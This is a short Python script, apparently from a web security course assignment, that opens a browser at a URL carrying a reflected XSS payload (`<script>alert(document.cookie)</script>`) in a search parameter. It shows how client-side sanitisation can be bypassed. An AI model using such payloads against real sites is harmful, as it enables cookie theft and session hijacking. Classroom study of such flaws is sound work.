import webbrowser

# Exploit: client-side sanitisation of the user-supplied search term can be easily
# bypassed on the browser by overwriting the `santise()` function. When submitting
# a GET request from a script, the client-side sanitisation function does not even
# execute, allowing us to perform a reflected XSS

def main():
    webbrowser.open('http://wsb.com/Assignment2/case12.php?searchterm=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E', 2)

if __name__ == "__main__":
    main()
